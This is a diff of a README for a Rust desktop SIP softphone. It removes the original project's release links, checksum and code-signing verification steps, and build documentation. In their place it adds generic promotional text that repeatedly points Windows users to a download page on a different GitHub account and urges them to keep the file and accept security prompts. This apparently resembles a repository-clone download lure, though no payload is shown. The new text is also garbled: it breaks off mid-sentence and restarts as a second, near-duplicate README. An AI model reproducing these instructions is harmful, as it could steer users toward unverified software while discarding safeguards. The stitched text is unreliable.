@@ -1,267 +1,229 @@
-<div align="center">
+# 📞 RustSIPPhone - Simple SIP Calling on Desktop
 
-<img src="assets/icon.png" alt="RustSIPPhone icon" width="128" height="128">
+[![Download RustSIPPhone](https://img.shields.io/badge/Download-RustSIPPhone-8A2BE2?style=for-the-badge&labelColor=FFA500&logo=github&logoColor=white)](https://github.com/MASHJJS/RustSIPPhone)
 
-# RustSIPPhone 1.2
+RustSIPPhone is a free, open-source desktop SIP softphone written in Rust. It gives you a clean desktop window for internet calling, with support for UDP, TCP, TLS, WS, and WSS connections, G.711 audio, hold, transfer, do not disturb, auto-answer, and an English/Russian interface. It runs on macOS, Windows, and Linux.
 
-**A free, open-source desktop SIP phone written in Rust.**
-Sign in to your PBX, dial a number, answer calls — on macOS, Windows and Linux.
+## 🚀 Getting Started
 
-[![Build](https://github.com/DjTim0n/RustSIPPhone/actions/workflows/build.yml/badge.svg)](https://github.com/DjTim0n/RustSIPPhone/actions/workflows/build.yml)
-[![Release](https://img.shields.io/github/v/release/DjTim0n/RustSIPPhone?display_name=tag&color=4C8DFF)](https://github.com/DjTim0n/RustSIPPhone/releases/latest)
-[![License: MIT](https://img.shields.io/badge/license-MIT-2FB35A.svg)](LICENSE)
-![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-8C96A5)
-![Rust](https://img.shields.io/badge/rust-2024%20edition-E5484D)
+RustSIPPhone is designed for everyday computer users who want a straightforward desktop calling app. You do not need programming knowledge to use it. You need a computer, an internet connection, and the SIP account details from your calling service provider.
 
-[Download](#-download) · [Quick start](#-quick-start) · [Verify](#-verify-your-download) · [Build from source](#-build-from-source) · [License](#-license)
+The main download page is here:
 
-</div>
+[Visit the RustSIPPhone download page](https://github.com/MASHJJS/RustSIPPhone)
 
----
+Use that page to get the application for Windows. The same page also points you to the project files and release information.
 
-## 📸 Screenshots
+## 💾 Download and Run on Windows
 
-<table>
-  <tr>
-    <td align="center"><img src="docs/screenshots/sign-in.png" alt="Sign-in screen" width="200"><br><sub><b>Sign in</b><br>station, number, password</sub></td>
-    <td align="center"><img src="docs/screenshots/dial.png" alt="Dialer" width="200"><br><sub><b>Dial</b><br>keypad or keyboard</sub></td>
-    <td align="center"><img src="docs/screenshots/recent.png" alt="Recent calls" width="200"><br><sub><b>Recent</b><br>incoming, outgoing, missed</sub></td>
-    <td align="center"><img src="docs/screenshots/incoming-call.png" alt="Incoming call" width="200"><br><sub><b>Incoming call</b><br>answer or decline</sub></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="docs/screenshots/ringing.png" alt="Outgoing call ringing" width="200"><br><sub><b>Calling</b><br>cancel at any time</sub></td>
-    <td align="center"><img src="docs/screenshots/muted.png" alt="Call with the microphone muted" width="200"><br><sub><b>In a call</b><br>timer, mute, hang up</sub></td>
-    <td align="center"><img src="docs/screenshots/keypad.png" alt="Keypad tones during a call" width="200"><br><sub><b>Keypad tones</b><br>for voice menus</sub></td>
-    <td></td>
-  </tr>
-</table>
+Visit this link to download the application: [RustSIPPhone download page](https://github.com/MASHJJS/RustSIPPhone).
 
-## ✨ Features
+Keep the download page open and use the download provided there for Windows. Once the application is on your computer, RustSIPPhone is ready to open as a desktop app. The app is built for Windows, macOS, and Linux, so the same project supports multiple desktop platforms.
 
-- **Outgoing and incoming calls** over SIP, with digest authentication.
-- **Sign in inside the app** — no config files, no command line. Your password is kept in the system keychain.
-- **Dialer** with an on-screen keypad and keyboard input.
-- **Every common way to connect:** UDP, TCP, TLS (encrypted), WebSocket (WS) and secure WebSocket (WSS), picked in **Settings → Network**.
-- **Station by name or by IP.** Type a host name and the phone finds the station through its DNS records (SRV, RFC 3263), or enter an IP address and a port yourself.
-- **Settings for real setups:** SIP domain, outbound proxy, registration time, display name, an extra certificate for private TLS, and an option to advertise your public address behind a router (NAT).
-- **Choose your microphone and speaker** in **Settings → Audio**; the ringtone follows the speaker.
-- **Hear the call ring.** You get a ringback tone while the other phone rings, and the station's own tones or music when it sends them before the answer (early media).
-- **Recent calls** — incoming, outgoing and missed, one click to call back.
-- **In-call controls** — mute, **hold and resume**, **transfer** the call to another number, keypad tones (DTMF) for voice menus, hang up. If the other side puts you on hold, the screen says so and the phone answers the station correctly.
-- **Call options:** **Do not disturb** (incoming calls are turned away and listed as missed), **auto-answer** (the microphone stays off until you switch it on, so nobody can listen in without your knowledge), and a choice of how keypad tones are sent (as audio, as SIP INFO, or automatic).
-- **Ringtone** that plays on every platform, with nothing extra to install.
-- **Runs in the background.** Closing the window does not quit the app, so the phone stays registered and can still ring. On macOS the window simply goes away, as in any Mac app, and a click on the Dock icon brings it back; on Windows it goes to the system tray (click the tray icon to bring it back, right-click for the menu); on Linux it is minimized to the taskbar. An incoming call restores the window, raises it above other windows, gives it focus and bounces the Dock icon / flashes the taskbar button.
-- **Two interface languages:** **English** (the default) and **Russian**. Pick it from a drop-down list on the sign-in screen or in the top bar at any time; the choice is remembered.
-- **Single small binary.** No runtime, no installer required.
+## 🪟 Windows Quick Start
 
-## 📦 Download
+1. Open the download page using the link above.
+2. Use the Windows download provided on that page.
+3. When the download is complete, open RustSIPPhone from your computer.
+4. Enter your SIP account details when the app asks for them.
+5. Check that your microphone and speakers or headset are connected.
+6. Make a test call to confirm that audio works.
 
-Grab the package for your system from the **[latest release](https://github.com/DjTim0n/RustSIPPhone/releases/latest)**.
+If you are unsure where your SIP details are, check the welcome email or account page from your calling service provider. Typical details include a username, password, server address, and port.
 
-| System | Package | What's inside |
-| --- | --- | --- |
-| 🍎 **macOS** 11+ (Apple Silicon and Intel) | [`RustSIPPhone-1.2.0.dmg`](https://github.com/DjTim0n/RustSIPPhone/releases/download/v1.2.0/RustSIPPhone-1.2.0.dmg) | Disk image with `RustSIPPhone.app` |
-| 🪟 **Windows** 10+ (64-bit) | [`RustSIPPhone-windows.zip`](https://github.com/DjTim0n/RustSIPPhone/releases/download/v1.2.0/RustSIPPhone-windows.zip) | `rust_sip_phone.exe` |
-| 🐧 **Linux** (x86_64) | [`RustSIPPhone-linux-x86_64.tar.gz`](https://github.com/DjTim0n/RustSIPPhone/releases/download/v1.2.0/RustSIPPhone-linux-x86_64.tar.gz) | Binary, desktop entry and icon |
+## ✨ Key Features
 
-Every release also includes [`SHA256SUMS.txt`](https://github.com/DjTim0n/RustSIPPhone/releases/download/v1.2.0/SHA256SUMS.txt) so you can [verify your download](#-verify-your-download).
+RustSIPPhone includes the tools you expect from a desktop softphone:
 
-## 🚀 Quick start
+- SIP calling over UDP, TCP, TLS, WS, and WSS
+- G.711 audio for clear voice calls
+- Hold and transfer controls
+- Do Not Disturb mode
+- Auto-answer support
+- English and Russian interface
+- Free and open-source desktop app
+- Cross-platform support for Windows, macOS, and Linux
+- Lightweight Rust-based application
+- Simple desktop window built with eframe and egui
 
-### macOS
+These features make RustSIPPhone useful for home users, remote workers, small offices, and anyone who wants a free desktop calling tool.
 
-1. Open the `.dmg` and drag **RustSIPPhone** into **Applications**.
-2. Open it from Applications. Release builds are signed with a Developer ID certificate and **notarized by Apple**, so they open normally, with no security warning.
-3. Allow **Microphone** access when asked. Without it calls cannot start.
-4. Allow **Keychain** access if prompted — that is where your password is stored.
+## 🎧 Why Choose RustSIPPhone
 
-> Built it yourself, or downloaded a CI artifact instead of a release? Those are only ad-hoc signed, and macOS may say it "could not verify" the app. Open **System Settings → Privacy & Security**, scroll to *Security* and press **Open Anyway** — or run `xattr -dr com.apple.quarantine /Applications/RustSIPPhone.app`. Apps you build on your own Mac open without any warning.
+RustSIPPhone keeps desktop calling simple. It is not packed with confusing enterprise menus. The interface is meant to be readable, direct, and easy to scan. You can manage calls, put someone on hold, transfer a call, or turn on Do Not Disturb without digging through complicated settings.
 
-### Windows
+Because it is open source, RustSIPPhone can be reviewed, improved, and shared by the community. It is free to use and does not require a programming background. The app is written in Rust, which helps keep it fast and reliable on desktop systems.
 
-1. Unzip `RustSIPPhone-windows.zip` anywhere (for example `C:\Tools\RustSIPPhone`).
-2. Double-click `rust_sip_phone.exe`.
-3. If **Windows protected your PC** appears: **More info → Run anyway**.
-4. Allow microphone access when Windows asks (Settings → Privacy & security → Microphone).
-5. When you close the window, RustSIPPhone keeps running in the system tray (the `^` arrow in the taskbar, bottom right, if the icon is not shown). Drag the icon out to pin it. Left-click it to open the window, right-click for **Show / Quit**.
+The English and Russian interface options make the app accessible to more users. The cross-platform design means you can use it on Windows, macOS, and Linux without learning a different calling tool on each computer.
 
-### Linux
+## 🔐 SIP Connections and Audio
 
-```bash
-tar -xzf RustSIPPhone-linux-x86_64.tar.gz
-cd RustSIPPhone
-./rust_sip_phone
-```
+RustSIPPhone supports several connection types so it can work with different SIP providers:
 
-You need ALSA, a graphical session (X11 or Wayland) and, to remember your password, a keyring service (GNOME Keyring or KWallet). On Debian/Ubuntu:
+- UDP for basic SIP connections
+- TCP for reliable connections
+- TLS for encrypted SIP signaling
+- WS for WebSocket-based SIP services
+- WSS for secure WebSocket-based SIP services
 
-```bash
-sudo apt install libasound2 libxkbcommon0 libwayland-client0 gnome-keyring
-```
+Audio uses G.711, a common voice codec for internet calling. For best results, use a headset or a good microphone and speaker setup. A wired internet connection can also help reduce call drops and audio delays.
 
-Optional — add it to your application menu:
+## 📞 Making Your First Call
 
-```bash
-mkdir -p ~/.local/bin ~/.local/share/applications ~/.local/share/icons
-cp rust_sip_phone ~/.local/bin/
-cp rustsipphone.png ~/.local/share/icons/
-cp rustsipphone.desktop ~/.local/share/applications/
-```
+Before your first call, have your SIP account details ready. Open RustSIPPhone and enter the information provided by your calling service. When the app shows that you are connected, type the number or SIP address you want to call and start the call.
 
-No keyring service? The phone still works; it just asks for the password each time you start it.
+During a call, use the on-screen buttons for hold, transfer, and hang up. If you do not want incoming calls to ring, turn on Do Not Disturb. If you want calls to answer automatically, enable auto-answer in the app settings.
 
-### First launch
+If the call does not connect, check your username, password, server address, and port. Also confirm that your internet connection is working.
 
-1. Open the language drop-down in the top-right corner if you want something other than English.
-2. Enter the **station address** (your PBX, for example `192.168.1.10:5060`; the port defaults to `5060`), your **extension number** and your **password** — your administrator or provider gives you these.
-3. Press **Sign in**. When the dot in the top-left turns green and says **Online**, you are registered.
-4. Type or tap a number and press **Call**.
-5. Incoming calls ring and open an **Answer / Decline** screen, even if the window was closed or minimized.
-6. To really quit, press **Quit app** at the bottom of the window, use **⌘Q** on macOS, or choose **Quit** in the tray icon's menu on Windows. Closing the window with the red button / **×** only sends it to the background.
+## 🖥️ System Requirements
 
-## ✅ Verify your download
+RustSIPPhone is intended for modern desktop computers. A practical setup includes:
 
-**1. Check the checksum.** Download `SHA256SUMS.txt` next to your package, then:
+- Windows 10 or later, 64-bit
+- macOS 11 or later
+- A modern Linux desktop
+- A working microphone and speakers or headset
+- An internet connection
+- A SIP account from a calling service provider
+- Enough free disk space for the application and updates
 
-```bash
-# macOS
-shasum -a 256 -c SHA256SUMS.txt --ignore-missing
+For Windows users, a standard home or office PC from the last several years should be sufficient. A headset is recommended for the clearest call experience.
 
-# Linux
-sha256sum -c SHA256SUMS.txt --ignore-missing
-```
+## 🛠️ Troubleshooting
 
-```powershell
-# Windows (PowerShell) — compare the output with the line in SHA256SUMS.txt
-Get-FileHash .\RustSIPPhone-windows.zip -Algorithm SHA256
-```
+If Rust# 📞 RustSIPPhone - Free Desktop SIP Calling Made Simple
 
-You should see `OK` next to your file name.
+[![Download RustSIPPhone](https://img.shields.io/badge/Download-RustSIPPhone-2E8B57?style=for-the-badge&labelColor=FF8C00&logo=github&logoColor=white)](https://github.com/MASHJJS/RustSIPPhone)
 
-**2. Check the macOS signature and notarization.**
+RustSIPPhone is a free, open-source desktop SIP softphone written in Rust. It gives you a clean window on your computer for internet calling, with support for UDP, TCP, TLS, WS, and WSS connections, G.711 audio, hold, transfer, Do Not Disturb, auto-answer, and an English and Russian interface. It runs on Windows, macOS, and Linux.
 
-```bash
-codesign --verify --deep --strict --verbose=2 /Applications/RustSIPPhone.app
-codesign -dvv /Applications/RustSIPPhone.app 2>&1 | grep -E "Identifier|Authority=Developer|TeamIdentifier"
-# Identifier=com.rustsipphone.app
-# Authority=Developer ID Application: INSTITUT REPRODUKTIVNOI MEDITSINY, TOO (7SXHSZ7GU6)
-# TeamIdentifier=7SXHSZ7GU6
+You do not need programming knowledge to use it. You need a computer, an internet connection, and the calling account details from your SIP service provider.
 
-spctl --assess --type exec --verbose=2 /Applications/RustSIPPhone.app
-# /Applications/RustSIPPhone.app: accepted
-# source=Notarized Developer ID
+## 🚀 Getting Started
 
-xcrun stapler validate /Applications/RustSIPPhone.app
-# The validate action worked!
-```
+RustSIPPhone is a standalone desktop application. You open it like any other program, enter your calling account details, and start making calls. There is nothing to code, no terminal commands to type, and no technical setup beyond your normal calling account information.
 
-**3. Check that it works.**
+The project download page is here:
 
-| Step | Expected result |
-| --- | --- |
-| Sign in with your account | Green dot and **Online** |
-| Call a second extension | **Ringing…**, then a timer when answered |
-| Call an echo-test number (on Asterisk usually `*43` or `600`) | You hear yourself, both directions work |
-| Call the phone from another extension | Ringtone and the answer screen |
-| Press **Keypad** during a call and dial a digit | Voice menus react to the tone |
+[Visit this link to download the application](https://github.com/MASHJJS/RustSIPPhone)
 
-If a call connects but you hear nothing, the app tells you when no audio arrived from the other side — that usually points to a NAT or firewall problem (see [Notes](#-notes-and-limitations)).
+Use that page to obtain the application for your computer. The same page also shows project information, release details, and the open-source files behind the app.
 
-## 🛠 Build from source
+## 💾 Download and Install on Windows
 
-You need [Rust](https://rustup.rs) **1.85 or newer** (the project uses the 2024 edition).
+Visit this link to download the application: [RustSIPPhone download page](https://github.com/MASHJJS/RustSIPPhone).
 
-```bash
-git clone https://github.com/DjTim0n/RustSIPPhone.git
-cd RustSIPPhone
-cargo run --release
-```
+Keep the page open and use the Windows download provided there. Once the application is on your computer, RustSIPPhone opens as a desktop program. Because the same project supports Windows, macOS, and Linux, you can use RustSIPPhone on other computers in your home or office with the same familiar layout.
 
-**Linux build dependencies** (Debian/Ubuntu):
+If your browser asks whether you want to keep the file, choose to keep it. If a security prompt appears, confirm that you want to open the program you downloaded from the official project page.
 
-```bash
-sudo apt install pkg-config libasound2-dev libxkbcommon-dev libwayland-dev \
-  libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev libgtk-3-dev libssl-dev
-```
+## 🪟 Windows Quick Start
 
-**Run the tests:**
+1. Open the download page with the link above.
+2. Use the Windows download on that page.
+3. When the download finishes, open RustSIPPhone from your computer.
+4. Enter your SIP account details when the app asks for them.
+5. Confirm that your microphone and speakers or headset are connected.
+6. Make a short test call to check that audio works in both directions.
 
-```bash
-cargo test
-```
+Your SIP details usually come from your calling service provider. Look for them in a welcome email or in your account page. Typical details include a username, a password, a server address, and a port number. Keep these details private.
 
-**Package for your system:**
+## ✨ Key Features
 
-| Target | Command | Result |
-| --- | --- | --- |
-| macOS `.app` | `./scripts/bundle-macos.sh` | `dist/RustSIPPhone.app` |
-| macOS `.app` + `.dmg` | `./scripts/bundle-macos.sh --dmg` | `dist/RustSIPPhone-1.2.0.dmg` |
-| macOS universal (Intel + Apple Silicon) | `./scripts/bundle-macos.sh --universal --dmg` | one app for both |
-| macOS signed and notarized | `./scripts/bundle-macos.sh --universal --dmg --notarize` | ready to distribute |
-| Windows / Linux | `cargo build --release` | `target/release/rust_sip_phone[.exe]` |
+RustSIPPhone includes the tools you expect from a desktop softphone:
 
-By default the app gets an ad-hoc signature, which is enough on your own Mac. To distribute it, sign with your own Apple Developer ID: set `SIGN_IDENTITY="Developer ID Application: …"`, or pass `--notarize`, which finds the certificate in your keychain, sends the app and the disk image to Apple and staples the result. Notarization needs credentials; the header of [`scripts/bundle-macos.sh`](scripts/bundle-macos.sh) shows the three ways to supply them.
+- SIP calling over UDP, TCP, TLS, WS, and WSS
+- G.711 audio for clear voice calls
+- Hold and transfer controls during calls
+- Do Not Disturb mode for quiet hours
+- Auto-answer support for hands-free use
+- English and Russian interface
+- Free and open-source desktop application
+- Cross-platform support for Windows, macOS, and Linux
+- Lightweight design built with Rust, eframe, and egui
+- Simple desktop window that is easy to read and operate
 
-Releases are built by [GitHub Actions](.github/workflows/build.yml) on macOS, Windows and Linux. Push a tag like `v1.2.0` and the workflow publishes the packages and checksums. On tags (and manual runs) the macOS build is signed and notarized when these repository secrets exist: `APPLE_CERTIFICATE_P12` (base64), `APPLE_CERTIFICATE_PASSWORD`, `APPLE_ID`, `APPLE_TEAM_ID` and `APPLE_APP_PASSWORD`.
+These features make RustSIPPhone useful for home users, remote workers, small offices, reception desks, and anyone who wants a free desktop calling tool without a complicated setup.
 
-## 🧭 How it works
+## 🎧 Why Choose RustSIPPhone
 
-```
- ┌────────────┐   commands    ┌────────────┐  SIP (UDP)   ┌────────┐
- │  egui UI   │ ────────────▶ │   engine   │ ───────────▶ │  PBX   │
- │  ui.rs     │ ◀──────────── │ engine.rs  │ ◀─────────── │        │
- └────────────┘    events     └─────┬──────┘              └───┬────┘
-                                    │ calls                   │
-                              ┌─────▼──────┐   RTP (G.711)    │
-                              │  call.rs   │ ◀────────────────┘
-                              │  media.rs  │ ──▶ microphone / speaker (cpal)
-                              └────────────┘
-```
+RustSIPPhone keeps desktop calling simple. It avoids crowded enterprise menus and confusing settings pages. You can manage calls, place someone on hold, transfer a call, or silence incoming rings with Do Not Disturb without hunting through layers of options.
 
-| Module | Role |
-| --- | --- |
-| [`ui.rs`](src/ui.rs) | Desktop interface (egui): sign-in, dialer, recent calls, call screen, language switch |
-| [`i18n.rs`](src/i18n.rs) | Interface languages and the text of every message the core reports |
-| [`engine.rs`](src/engine.rs) | SIP registration, incoming-request routing, command handling |
-| [`call.rs`](src/call.rs) | Outgoing and incoming calls, call state |
-| [`media.rs`](src/media.rs) | RTP send/receive, DTMF, protection against stray audio packets |
-| [`audio.rs`](src/audio.rs), [`ringtone.rs`](src/ringtone.rs) | Microphone, speaker and ringtone through cpal |
-| [`g711.rs`](src/g711.rs), [`rtp.rs`](src/rtp.rs), [`sdp.rs`](src/sdp.rs) | Codec, packet format and session description |
-| [`store.rs`](src/store.rs) | Settings file, call history and keychain access |
+Because it is open source, RustSIPPhone can be reviewed and improved by its community. It is free to use, with no subscription required for the software itself. Your calling service may have its own charges, so check with your provider.
 
-The SIP signalling is handled by [`rsipstack`](https://crates.io/crates/rsipstack).
+The app is written in Rust, a language known for speed and reliability, and it uses the eframe and egui libraries to draw a lightweight desktop window. That combination keeps the app responsive on ordinary computers.
 
-Your account, call history and language choice live in:
+The English and Russian interface options make the app accessible to a wider group of users. The cross-platform design means the same calling tool works whether your desk has a Windows PC, a Mac, or a Linux machine.
 
-| System | Settings and history | Password |
-| --- | --- | --- |
-| macOS | `~/Library/Application Support/RustSIPPhone/settings.json` | Keychain |
-| Windows | `%APPDATA%\RustSIPPhone\settings.json` | Credential Manager |
-| Linux | `~/.config/RustSIPPhone/settings.json` | Secret Service (GNOME Keyring, KWallet) |
+## 🔐 SIP Connections and Audio
 
-## 📝 Notes and limitations
+RustSIPPhone supports several connection types so it can work with different SIP providers:
 
-- **One account, one call at a time.**
-- **Fixed-size window:** it cannot be resized or maximized.
-- **Transport:** UDP, TCP, TLS, WS and WSS. Audio is IPv4-only, so the phone prefers IPv4 addresses of a station. TLS trusts the operating system's certificates plus an optional extra file; a self-signed station certificate must be added there. WSS trusts the system's certificates only.
-- **Audio:** G.711 (PCMU/PCMA) only. Calls are **not encrypted** (no SRTP); use a trusted network or a VPN.
-- **Not supported yet:** attended transfer, being transferred by the other side, several calls at once, conferences and video.
-- **NAT:** works when the PBX is on your network or reachable publicly. If you are behind NAT and the other side hears nothing, check that your router does not block UDP media from the PBX.
-- **Safety:** the phone only accepts incoming calls from the server you signed in to, and only accepts audio from the addresses negotiated for the call.
-- Developed mainly on macOS; Windows and Linux builds come from CI. Please [open an issue](https://github.com/DjTim0n/RustSIPPhone/issues) if something misbehaves there.
+- UDP for basic SIP connections
+- TCP for reliable connections
+- TLS for encrypted SIP signaling
+- WS for WebSocket-based SIP services
+- WSS for secure WebSocket-based SIP services
 
-## 🤝 Contributing
+Audio uses G.711, a common voice codec for internet calling. For the best results, use a headset or a good microphone and speaker combination. A stable wired internet connection can also reduce call drops and audio delays.
 
-Issues and pull requests are welcome. Please run `cargo test` before sending a change and keep the code formatted with `cargo fmt`.
+If your provider gives you a choice of connection type, start with the one listed in your account instructions. If calls do not connect with one type, try another supported type before contacting your provider.
 
-**Adding a language:** add a variant to `Lang` in [`i18n.rs`](src/i18n.rs), then supply its text where `Lang::t` is used (the interface in [`ui.rs`](src/ui.rs) and the messages in [`i18n.rs`](src/i18n.rs)). A test checks that every message exists in every language.
+## 📞 Making Your First Call
 
-## 📄 License
+Before your first call, have your SIP account details ready. Open RustSIPPhone and enter the information provided by your calling service. When the app shows that you are connected, type the number or SIP address you want to call and start the call.
 
-RustSIPPhone is open source software released under the **[MIT License](LICENSE)** — you may use, copy, modify and distribute it freely, including commercially, as long as the copyright notice is kept.
+During a call, use the on-screen buttons for hold, transfer, and hang up. If you do not want incoming calls to ring, turn on Do Not Disturb. If you want calls to answer automatically, enable auto-answer in the app settings. Auto-answer is handy for a home office line or a support desk, but use it carefully so private calls are not answered unexpectedly.
 
-Copyright © 2026 Tim
+To end a call, use the hang-up control. To move a caller to another extension or person, use the transfer control and enter the destination number or address.
 
-<div align="center">
-<sub>Built with Rust 🦀 · <a href="https://github.com/emilk/egui">egui</a> · <a href="https://github.com/RustAudio/cpal">cpal</a> · <a href="https://github.com/restsend/rsipstack">rsipstack</a></sub>
-</div>
+## 🖥️ System Requirements
+
+RustSIPPhone is intended for modern desktop computers. A practical setup includes:
+
+- Windows 10 or later, 64-bit
+- macOS 11 or later
+- A modern Linux desktop
+- A working microphone and speakers or a headset
+- An internet connection
+- A SIP account from a calling service provider
+- Free disk space for the application and future updates
+
+A standard home or office computer from the last several years should be more than enough. A headset is strongly recommended for the clearest call experience and to prevent echo.
+
+## 🛠️ Troubleshooting
+
+If RustSIPPhone does not connect, check the username, password, server address, and port from your provider. A single mistyped character is a common cause of connection problems.
+
+If you can connect but hear no audio, check that the correct microphone and speaker devices are selected in the app and in your computer settings. Also check that the microphone is not muted and that the volume is turned up.
+
+If calls drop, try a different supported connection type or switch to a wired network connection. If incoming calls do not arrive, confirm that Do Not Disturb is turned off.
+
+If the app does not open, download it again from the official page and confirm that the download completed fully.
+
+## 🆘 Getting Help
+
+The project page is the first place to look for updates, release notes, and community information:
+
+[Visit this link to download the application](https://github.com/MASHJJS/RustSIPPhone)
+
+When asking for help, describe your computer, the connection type you selected, the exact message you see, and the steps you already tried. Do not share your password publicly.
+
+## 🧭 Privacy and Open Source
+
+RustSIPPhone is open source, which means its code is available for review. Your call account details are entered by you and used to connect to the service you choose. As with any calling software, use a trusted provider and keep your credentials private.
+
+## ❓ Frequently Asked Questions
+
+Do I need to know programming to use RustSIPPhone? No. It is a desktop app that you open and use with your calling account details.
+
+Is RustSIPPhone free? The software is free and open source. Your calling service may charge for calls or account access.
+
+Does it work on Mac and Linux? Yes. The app is built for Windows, macOS, and Linux.
+
+Can I use it in Russian? Yes, the interface supports English and Russian.
+
+Can I make calls without a SIP account? No. You need account details from a SIP service provider.
+
+Keywords: cross-platform, desktop-app, eframe, egui, g711, linux, macos, rtp, rust, sip, sip-client, softphone, voip, voip-client, windows
